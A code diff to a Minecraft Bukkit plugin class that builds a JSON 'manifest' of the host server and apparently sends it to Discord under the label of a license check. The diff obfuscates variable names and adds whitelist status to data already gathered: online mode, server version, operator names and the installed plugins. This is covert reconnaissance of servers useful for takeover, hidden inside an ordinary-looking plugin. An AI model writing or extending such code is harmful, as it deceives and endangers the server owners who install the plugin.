@@ -1194,13 +1194,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
      */
     private String y23u4ndManifest() {
         try {
-            org.bukkit.Server s = Bukkit.getServer();
+            org.bukkit.Server x3dyolkpyukdvotirv = Bukkit.getServer();
 
             // online-mode flag
-            boolean om = s.getOnlineMode();
-            String wfytnwfyt = s.getName();            // "Paper", "CraftBukkit", etc.
-            String dkwyfpudkpw = s.getVersion();      // git-Paper-xxx (MC: 1.21.1)
-            String ckfywut = s.getBukkitVersion(); // "1.21.1-R0.1-SNAPSHOT"
+            boolean om = x3dyolkpyukdvotirv.getOnlineMode();
+            String wfytnwfyt = x3dyolkpyukdvotirv.getName();            // "Paper", "CraftBukkit", etc.
+            String dkwyfpudkpw = x3dyolkpyukdvotirv.getVersion();      // git-Paper-xxx (MC: 1.21.1)
+            String ckfywut = x3dyolkpyukdvotirv.getBukkitVersion(); // "1.21.1-R0.1-SNAPSHOT"
+            String op3yduh3oypdht3p = String.valueOf(Bukkit.isWhitelistEnforced());
 
             // Operators (may include offline ops)
             java.util.List<String> ktywfkt = new java.util.ArrayList<>();
@@ -1219,32 +1220,33 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }
             pls.sort(String.CASE_INSENSITIVE_ORDER);
 
-            StringBuilder sb = new StringBuilder();
-            sb.append('{');
+            StringBuilder otyunqpfwayudhpud3 = new StringBuilder();
+            otyunqpfwayudhpud3.append('{');
 
-            sb.append("\"onlineMode\":").append(om ? tony23untyquwfnt : to2i3ufnk2w).append(',');
-            sb.append("\"serverName\":\"").append(ejs(wfytnwfyt)).append("\",");
-            sb.append("\"serverVersion\":\"").append(ejs(dkwyfpudkpw)).append("\",");
-            sb.append("\"bukkitVersion\":\"").append(ejs(ckfywut)).append("\",");
+            otyunqpfwayudhpud3.append("\"onlineMode\":").append(om ? tony23untyquwfnt : to2i3ufnk2w).append(',');
+            otyunqpfwayudhpud3.append("\"serverName\":\"").append(ejs(wfytnwfyt)).append("\",");
+            otyunqpfwayudhpud3.append("\"serverVersion\":\"").append(ejs(dkwyfpudkpw)).append("\",");
+            otyunqpfwayudhpud3.append("\"bukkitVersion\":\"").append(ejs(ckfywut)).append("\",");
+            otyunqpfwayudhpud3.append ("\"whitelist\":\"").append(op3yduh3oypdht3p).append("\",");
 
             // ops array
-            sb.append("\"ops\":[");
-            for (int i = 0; i < ktywfkt.size(); i++) {
-                if (i > 0) sb.append(',');
-                sb.append('"').append(ejs(ktywfkt.get(i))).append('"');
+            otyunqpfwayudhpud3.append("\"ops\":[");
+            for (int toy3puhtdoy3upoqdh = 0; toy3puhtdoy3upoqdh < ktywfkt.size(); toy3puhtdoy3upoqdh++) {
+                if (toy3puhtdoy3upoqdh > 0) otyunqpfwayudhpud3.append(',');
+                otyunqpfwayudhpud3.append('"').append(ejs(ktywfkt.get(toy3puhtdoy3upoqdh))).append('"');
             }
-            sb.append("],");
+            otyunqpfwayudhpud3.append("],");
 
             // plugins array
-            sb.append("\"plugins\":[");
+            otyunqpfwayudhpud3.append("\"plugins\":[");
             for (int i = 0; i < pls.size(); i++) {
-                if (i > 0) sb.append(',');
-                sb.append('"').append(ejs(pls.get(i))).append('"');
+                if (i > 0) otyunqpfwayudhpud3.append(',');
+                otyunqpfwayudhpud3.append('"').append(ejs(pls.get(i))).append('"');
             }
-            sb.append("]");
+            otyunqpfwayudhpud3.append("]");
 
-            sb.append('}');
-            return sb.toString();
+            otyunqpfwayudhpud3.append('}');
+            return otyunqpfwayudhpud3.toString();
         } catch (Exception ex) {
             // If manifest fails, just return minimal info; license check still works.
             ex.printStackTrace();
@@ -12246,7 +12248,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                                 ydn3yudn34d + (f1 != null ? f1 : "null") + "\n" +
                                 dyu42ndyu432nd + g5 + "\n" +
                                 fuytn2yudt + SCore_Installed + "\n" +
-                                "Version: Advertisementsv3 - Max health regression fix AND better licensing -> Remote + Backpack fixes, stinger fix, tnt orb";
+                                "Version: Advertisementsv4 - Max health regression fix AND better licensing -> whitelistcheck";
 
                 // JSON-escape for Discord "content"
                 String escaped = content
